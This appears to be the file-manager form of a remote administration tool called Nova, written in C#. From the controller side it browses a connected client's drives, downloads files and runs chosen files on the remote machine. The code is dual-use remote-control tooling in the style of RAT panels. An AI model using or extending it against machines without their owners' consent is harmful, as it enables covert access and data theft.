using Nova;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Nova.Forms
{
    public partial class frmFileManager : Form
    {
        private Client cClient;
        private string currentDir;
        private ListViewColumnSorter lvwColumnSorter;

        public frmFileManager(Client c)
        {
            cClient = c;
            cClient.Value.frmFM = this;
            InitializeComponent();

            lvwColumnSorter = new ListViewColumnSorter();
            lstDirectory.ListViewItemSorter = lvwColumnSorter;
        }

        private void frmFileManager_Load(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                this.Text = string.Format("Nova - 文件管理 [{0}:{1}]", cClient.EndPoint.Address.ToString(), cClient.EndPoint.Port.ToString());
                cClient.Send(new Nova.Packets.ServerPackets.Drives());
            }
        }

        private void frmFileManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (cClient.Value != null)
                cClient.Value.frmFM = null;
        }

        private void cmbDrives_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cClient != null)
            {

                if (cClient.Value != null)
                {
                    if (cClient.Value.lastDirectorySeen)
                    {
                        currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
                        cClient.Send(new Nova.Packets.ServerPackets.Folder(currentDir));
                        cClient.Value.lastDirectorySeen = false;
                    }
                }
            }
        }

        private void lstDirectory_DoubleClick(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                if (lstDirectory.SelectedItems.Count != 0)
                {
                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                    {
                        if (cClient.Value != null)
                        {
                            if (!currentDir.EndsWith(@"\"))
                                currentDir = currentDir + @"\";

                            currentDir = currentDir.Remove(currentDir.Length - 1);

                            if (currentDir.Length > 2)
                                currentDir = currentDir.Remove(currentDir.LastIndexOf(@"\"));

                            if (!currentDir.EndsWith(@"\"))
                                currentDir = currentDir + @"\";

                            cClient.Send(new Nova.Packets.ServerPackets.Folder(currentDir));
                            cClient.Value.lastDirectorySeen = false;
                        }
                    }
                    else if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir")
                    {
                        if (cClient.Value != null)
                        {
                            if (cClient.Value.lastDirectorySeen)
                            {
                                if (currentDir.EndsWith(@"\"))
                                    currentDir = currentDir + lstDirectory.SelectedItems[0].SubItems[0].Text;
                                else
                                    currentDir = currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;

                                cClient.Send(new Nova.Packets.ServerPackets.Folder(currentDir));
                                cClient.Value.lastDirectorySeen = false;
                            }
                        }
                    }
                }
            }
        }
        private void ctxtDownload_Click(object sender, EventArgs e)
        {
            if (cClient != null && lstDirectory.SelectedItems.Count != 0)
            {
                foreach (ListViewItem files in lstDirectory.SelectedItems)
                {
                    if (files.Tag.ToString() == "file")
                    {
                        string path = currentDir;
                        if (path.EndsWith(@"\"))
                            path = path + files.SubItems[0].Text;
                        else
                            path = path + @"\" + files.SubItems[0].Text;

                        int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index;
                        //Console.WriteLine(ID.ToString() + " " + files.Index);
                        ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
                        this.Invoke((MethodInvoker)delegate
                        {
                            //不加上去有延迟 ，到时候空指针 和下面网络处理
                            lstTransfers.Items.Add(lvi);
                        });
                        //不加上去 有延迟 ，到时候空指针 和下面网络处理
                        cClient.Send(new Nova.Packets.ServerPackets.DownloadFile(path, ID));
                    }
                }
            }
        }

        private void btnOpenDLFolder_Click(object sender, EventArgs e)
        {
            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + cClient.EndPoint.Address.ToString());

            if (Directory.Exists(downloadPath))
                Process.Start(downloadPath);
            else
                MessageBox.Show("还没有文件下载再!", "Nova - 文件管理", MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private void ctxtExecute_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem files in lstDirectory.SelectedItems)
            {
                if (files.Tag.ToString() == "file")
                {
                    string path = currentDir;
                    if (path.EndsWith(@"\"))
                        path = path + files.SubItems[0].Text;
                    else
                        path = path + @"\" + files.SubItems[0].Text;

                    if (cClient != null)
                        cClient.Send(new Nova.Packets.ServerPackets.StartProcess(path));
                }
            }
        }

        private void ctxtRefresh_Click(object sender, EventArgs e)
        {
            if (cClient != null)
            {
                cClient.Send(new Nova.Packets.ServerPackets.Folder(currentDir));
                cClient.Value.lastDirectorySeen = false;
            }
        }
        private void lstDirectory_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstDirectory.Sort();
        }
    }
}
